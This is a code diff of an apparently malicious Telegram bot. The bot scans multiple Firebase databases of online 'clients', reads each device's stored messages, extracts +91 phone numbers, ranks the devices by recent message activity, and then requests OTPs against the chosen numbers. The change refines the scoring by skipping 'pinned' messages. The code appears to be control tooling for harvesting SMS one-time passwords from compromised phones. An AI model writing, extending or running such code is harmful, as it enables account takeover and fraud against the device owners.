@@ -399,7 +399,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Inspecting messaging activity recency across DBs...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Analyzing unpinned recent message patterns...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -418,7 +418,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 db_activity_scores = []
                 async with aiohttp.ClientSession() as session:
                     for fb_url in firebase_dbs:
-                        max_msg_recency = 0
+                        activity_score = 0
                         online_devices_list = []
                         try:
                             async with session.get(f"{fb_url}clients.json", timeout=6) as r:
@@ -428,16 +428,23 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=1', timeout=4) as m_req:
+                                            # Fetch the last 7 messages to skip potential top pinned entries (e.g. index 0 & 1)
+                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=7', timeout=4) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
                                                 if phone:
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         online_devices_list.append({"firebase_url": fb_url, "cid": cid, "phone": full_phone})
+                                                        
+                                                        # Analyze unpinned recent messages (skip top 2 pinned messages, inspect messages 3, 4, 5, 6, 7)
                                                         if isinstance(msgs, dict):
-                                                            for m_key in msgs.keys():
-                                                                max_msg_recency = max(max_msg_recency, len(m_key))
+                                                            msg_keys = list(msgs.keys())
+                                                            # If we have more than 2 messages, ignore the first 2 (pinned ones) and evaluate the rest
+                                                            unpinned_keys = msg_keys[2:] if len(msg_keys) > 2 else msg_keys
+                                                            for m_key in unpinned_keys:
+                                                                # Give higher score weight to fresher unpinned message keys / timestamps
+                                                                activity_score = max(activity_score, len(m_key))
                                         except Exception:
                                             pass
                         except Exception:
@@ -446,18 +453,19 @@ async def cb_start_automation(callback: types.CallbackQuery):
                         if online_devices_list:
                             db_activity_scores.append({
                                 "url": fb_url,
-                                "recency_score": max_msg_recency,
+                                "score": activity_score,
                                 "devices": online_devices_list
                             })
 
-                db_activity_scores.sort(key=lambda x: x["recency_score"], reverse=True)
+                # Sort databases by true unpinned recent activity score descending
+                db_activity_scores.sort(key=lambda x: x["score"], reverse=True)
 
                 online_targets = []
                 for db_info in db_activity_scores:
                     online_targets.extend(db_info["devices"])
 
                 if not online_targets:
-                    await logger.set_text("🔴 No active online devices with recent messaging activity found. Retrying in 5s...")
+                    await logger.set_text("🔴 No active online devices with unpinned recent messages found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
@@ -467,7 +475,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 phone = target["phone"]
                 used_phones.add(phone)
 
-                # Extract a clean short prefix for cross-checking (e.g., 'pogddssz')
                 db_short_id = firebase_url.split('//')[1].split('.')[0][:8]
 
                 await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
